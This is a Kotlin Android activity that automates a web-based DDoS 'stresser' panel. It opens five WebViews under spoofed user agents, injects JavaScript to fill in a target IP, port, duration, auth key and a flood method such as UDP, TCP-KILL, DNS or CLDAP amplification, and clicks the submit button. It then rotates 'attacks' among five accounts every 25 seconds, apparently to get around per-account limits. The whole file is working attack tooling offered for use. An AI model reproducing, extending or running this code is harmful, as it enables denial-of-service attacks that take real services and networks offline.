package com.stresstest.app

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.widget.*
import android.view.View
import android.widget.AdapterView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator

class MainActivity : AppCompatActivity() {
    
    private lateinit var viewPager: ViewPager2
    private lateinit var tabLayout: TabLayout
    private lateinit var timerText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private lateinit var setupTabsBtn: Button
    private lateinit var targetIpInput: EditText
    private lateinit var portInput: EditText
    private lateinit var durationInput: EditText
    private lateinit var authKeyInput: EditText
    private lateinit var methodSpinner: Spinner
    private lateinit var statusText: TextView
    private lateinit var tabStatusLayout: LinearLayout
    
    private var rotationActive = false
    private var currentTabIndex = 0
    private var handler = Handler(Looper.getMainLooper())
    private var currentSeconds = 25
    private var timerRunnable: Runnable? = null
    private var webViews = arrayOfNulls<WebView>(5)
    private var methods = arrayOf("UDP-BIG L4", "UDP-CUSTOM L4", "UDP-ZERO L4", "OVH-TCP L4", "CHAOS L4", "TCP-KILL L4", "DNS L4", "CLDAP L4")
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initViews()
        setupSpinner()
        setupViewPager()
        loadSavedSettings()
    }
    
    private fun initViews() {
        viewPager = findViewById(R.id.viewPager)
        tabLayout = findViewById(R.id.tabLayout)
        timerText = findViewById(R.id.timerText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)
        setupTabsBtn = findViewById(R.id.setupTabsBtn)
        targetIpInput = findViewById(R.id.targetIpInput)
        portInput = findViewById(R.id.portInput)
        durationInput = findViewById(R.id.durationInput)
        authKeyInput = findViewById(R.id.authKeyInput)
        methodSpinner = findViewById(R.id.methodSpinner)
        statusText = findViewById(R.id.statusText)
        tabStatusLayout = findViewById(R.id.tabStatusLayout)
        
        startBtn.setOnClickListener { startRotation() }
        stopBtn.setOnClickListener { stopRotation() }
        setupTabsBtn.setOnClickListener { setupTabs() }
    }
    
    private fun setupSpinner() {
        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, methods)
        methodSpinner.adapter = adapter
    }
    
    private fun setupViewPager() {
        val adapter = WebViewPagerAdapter(this, 5)
        viewPager.adapter = adapter
        viewPager.isUserInputEnabled = false
        
        TabLayoutMediator(tabLayout, viewPager) { tab, position ->
            tab.text = "Acc ${position + 1}"
        }.attach()
        
        // Get webviews after creation
        handler.postDelayed({
            for (i in 0 until 5) {
                val webView = getWebViewAt(i)
                webView?.let { setupWebView(it, i) }
            }
        }, 1000)
    }
    
    private fun setupWebView(webView: WebView, index: Int) {
        val settings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        
        val userAgents = listOf(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36"
        )
        settings.userAgentString = userAgents[index % userAgents.size]
        
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (url?.contains("/panel") == true) {
                    autoFillForm(webView)
                }
            }
        }
        
        webView.loadUrl("https://retrostress.net/panel")
        webViews[index] = webView
    }
    
    private fun autoFillForm(webView: WebView) {
        val targetIp = targetIpInput.text.toString()
        val port = portInput.text.toString()
        val duration = durationInput.text.toString()
        val authKey = authKeyInput.text.toString()
        val method = methods[methodSpinner.selectedItemPosition].replace(" L4", "")
        
        val jsCode = """
            (function() {
                // Fill auth key
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'text' && !inputs[i].placeholder.includes('Target') && !inputs[i].placeholder.includes('IP')) {
                        inputs[i].value = '$authKey';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('target')) {
                        inputs[i].value = '$targetIp';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('port')) {
                        inputs[i].value = '$port';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('duration')) {
                        inputs[i].value = '$duration';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                }
                // Select method
                var select = document.querySelector('select');
                if(select) {
                    for(var i=0; i<select.options.length; i++) {
                        if(select.options[i].text.includes('$method')) {
                            select.selectedIndex = i;
                            select.dispatchEvent(new Event('change', {bubbles:true}));
                            break;
                        }
                    }
                }
            })();
        """.trimIndent()
        
        webView.evaluateJavascript(jsCode, null)
    }
    
    private fun setupTabs() {
        if (authKeyInput.text.toString().isEmpty()) {
            Toast.makeText(this, "Enter authentication key first!", Toast.LENGTH_SHORT).show()
            return
        }
        
        statusText.text = "📑 Creating 5 tabs..."
        statusText.setTextColor(0xFFFFFF00.toInt())
        
        for (i in 0 until 5) {
            webViews[i]?.loadUrl("https://retrostress.net/panel")
        }
        
        handler.postDelayed({
            statusText.text = "✅ 5 tabs created! Login manually in each tab (ONCE)"
            statusText.setTextColor(0xFF00FF00.toInt())
            updateTabStatus()
        }, 3000)
    }
    
    private fun startRotation() {
        if (authKeyInput.text.toString().isEmpty()) {
            Toast.makeText(this, "Enter authentication key first!", Toast.LENGTH_SHORT).show()
            return
        }
        
        if (rotationActive) {
            Toast.makeText(this, "Rotation already running!", Toast.LENGTH_SHORT).show()
            return
        }
        
        rotationActive = true
        currentTabIndex = 0
        currentSeconds = 25
        updateTimerDisplay()
        
        attackCurrentTab()
        startTimer()
        
        statusText.text = "🟢 Rotation started! Attack every 25 sec"
        statusText.setTextColor(0xFF00FF00.toInt())
        updateTabStatus()
    }
    
    private fun startTimer() {
        stopTimer()
        
        timerRunnable = object : Runnable {
            override fun run() {
                if (rotationActive) {
                    if (currentSeconds > 0) {
                        currentSeconds--
                        updateTimerDisplay()
                        handler.postDelayed(this, 1000)
                    } else {
                        currentSeconds = 25
                        updateTimerDisplay()
                        currentTabIndex = (currentTabIndex + 1) % 5
                        attackCurrentTab()
                        updateTabStatus()
                        handler.postDelayed(this, 1000)
                    }
                }
            }
        }
        handler.post(timerRunnable!!)
    }
    
    private fun stopTimer() {
        timerRunnable?.let { handler.removeCallbacks(it) }
        timerRunnable = null
    }
    
    private fun updateTimerDisplay() {
        timerText.text = String.format("%02d:%02d", currentSeconds / 60, currentSeconds % 60)
        if (currentSeconds <= 5) {
            timerText.setTextColor(0xFFFF0000.toInt())
        } else {
            timerText.setTextColor(0xFF00FF00.toInt())
        }
    }
    
    private fun attackCurrentTab() {
        val webView = webViews[currentTabIndex]
        val targetIp = targetIpInput.text.toString()
        val port = portInput.text.toString()
        val duration = durationInput.text.toString()
        val authKey = authKeyInput.text.toString()
        val method = methods[methodSpinner.selectedItemPosition].replace(" L4", "")
        
        statusText.text = "🔴 ATTACKING: Tab ${currentTabIndex + 1} | $method | $targetIp:$port"
        
        val jsCode = """
            (function() {
                // Fill and click execute
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'text' && !inputs[i].placeholder.includes('Target')) {
                        inputs[i].value = '$authKey';
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('target')) {
                        inputs[i].value = '$targetIp';
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('port')) {
                        inputs[i].value = '$port';
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('duration')) {
                        inputs[i].value = '$duration';
                    }
                }
                var select = document.querySelector('select');
                if(select) {
                    for(var i=0; i<select.options.length; i++) {
                        if(select.options[i].text.includes('$method')) {
                            select.selectedIndex = i;
                            break;
                        }
                    }
                }
                var btn = document.querySelector('button');
                if(btn) btn.click();
                return 'done';
            })();
        """.trimIndent()
        
        webView?.evaluateJavascript(jsCode, null)
        
        // Switch to this tab
        viewPager.setCurrentItem(currentTabIndex, true)
        
        // Visual feedback
        Toast.makeText(this, "⚔️ Attack sent from Account ${currentTabIndex + 1}", Toast.LENGTH_SHORT).show()
    }
    
    private fun stopRotation() {
        rotationActive = false
        stopTimer()
        currentSeconds = 25
        updateTimerDisplay()
        statusText.text = "⏹ Rotation stopped"
        statusText.setTextColor(0xFFFF0000.toInt())
        updateTabStatus()
    }
    
    private fun updateTabStatus() {
        tabStatusLayout.removeAllViews()
        for (i in 0 until 5) {
            val tv = TextView(this)
            tv.text = if (i == currentTabIndex && rotationActive) "🔴${i+1}" else "⬜${i+1}"
            tv.textSize = 10f
            tv.setPadding(8, 4, 8, 4)
            if (i == currentTabIndex && rotationActive) {
                tv.setBackgroundColor(0xFF00FF00.toInt())
                tv.setTextColor(0xFF000000.toInt())
            } else {
                tv.setBackgroundColor(0xFF222222.toInt())
                tv.setTextColor(0xFF666666.toInt())
            }
            tv.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { marginEnd = 8 }
            tabStatusLayout.addView(tv)
        }
    }
    
    private fun getWebViewAt(position: Int): WebView? {
        return webViews[position]
    }
    
    fun registerWebView(position: Int, webView: WebView) {
        webViews[position] = webView
    }
    
    private fun loadSavedSettings() {
        val prefs = getSharedPreferences("stress_settings", MODE_PRIVATE)
        targetIpInput.setText(prefs.getString("target_ip", "127.0.0.1"))
        portInput.setText(prefs.getString("port", "80"))
        durationInput.setText(prefs.getString("duration", "30"))
        authKeyInput.setText(prefs.getString("auth_key", ""))
        methodSpinner.setSelection(prefs.getInt("method", 0))
    }
    
    override fun onPause() {
        super.onPause()
        val prefs = getSharedPreferences("stress_settings", MODE_PRIVATE)
        prefs.edit().apply {
            putString("target_ip", targetIpInput.text.toString())
            putString("port", portInput.text.toString())
            putString("duration", durationInput.text.toString())
            putString("auth_key", authKeyInput.text.toString())
            putInt("method", methodSpinner.selectedItemPosition)
            apply()
        }.apply()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopTimer()
    }
}
